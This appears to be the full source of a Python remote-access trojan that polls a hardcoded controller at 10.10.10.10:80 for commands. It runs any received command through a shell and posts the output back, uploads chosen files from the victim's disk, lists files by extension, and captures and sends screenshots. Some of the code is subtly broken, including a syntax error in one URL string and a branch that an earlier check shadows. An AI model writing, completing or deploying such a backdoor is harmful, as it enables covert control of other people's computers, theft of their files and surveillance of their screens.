import requests
import time
import subprocess
import os

from PIL import ImageGrab
import tempfile
import shutil

host = '10.10.10.10'
port = '80'
while True:
    req = requests.get(host+":"+port)
    command = req.text

    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab,path=command.split('*')
        if os.path.exists(path):
            url = 'http://'+host+':'+port'+/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url=host+':'+port, data='[-] Not able to find the file.')
    elif 'search' in command:
        command = command[7:]
        path,ext = command.split('*')
        list = ''
        for dirpath, dirname, files in os.walk(path):
            for file in files:
                if file.endswith(ext):
                    list = list+'\n'+os.path.join(dirpath, file)

        requests.post(url='http://'+host+':'+port, data=list)
        
    elif 'screengrab' in command:
        dirpath = tempfile.mkdtemp()
        ImageGrab.grab().save(dirpath+"\img.jpg", "JPEG")
        url = 'http://'+host+':'+port+'/store'
        files = {'file': open(dirpath+"\img.jpg", 'rb')}
        r = requests.post(url, files=files)
        files['file'].close()
        shutil.rmtree(dirpath)
    else:
        cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=host+":"+port, data=cmd.stdout.read())
        post_response = requests.post(url=host+":"+port, data=cmd.stderr.read())

    time.sleep(3)